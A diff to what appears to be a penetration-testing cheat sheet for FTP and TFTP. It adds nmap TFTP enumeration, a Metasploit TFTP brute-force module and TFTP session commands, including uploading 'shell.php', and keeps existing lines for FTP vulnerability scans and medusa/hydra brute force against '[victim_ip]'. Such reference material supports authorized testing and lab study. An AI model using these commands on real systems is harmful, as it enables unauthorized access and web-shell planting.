@@ -6,8 +6,14 @@ FTP protocol is used to transfer files from one machine to another machine
 - nmap -sV -sC [victim_ip] -p 21
 - namp --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default,ftp-user-enum -p [victim_ip]
 
+##### nmap tftp:
+- nmap -sU -p 69 --script tftp-enum.nse [victim_ip]
+
 ##### Connect to a FTP server
 - nc -nv [victim_ip] [port]
+
+##### metasploit tftp
+- use auxiliary/scanner/tftp/tftpbrute
 
 ##### Download attemps
 - ftp> GET boot.ini
@@ -29,6 +35,12 @@ FTP protocol is used to transfer files from one machine to another machine
 ##### Brute force
 - medusa -h [victim_ip] -u user -P passwords.txt -M ftp 
 - hydra -s [port] -C ./wordlists/ftp-default-userpass.txt -u -f [victim_ip] ftp
+
+#### TFTP
+- $ tftp [victim_ip]
+- tftp> ls
+- tftp> verbose
+- tftp> put shell.php
 
 ##### Windows dir change with ~1
 ```
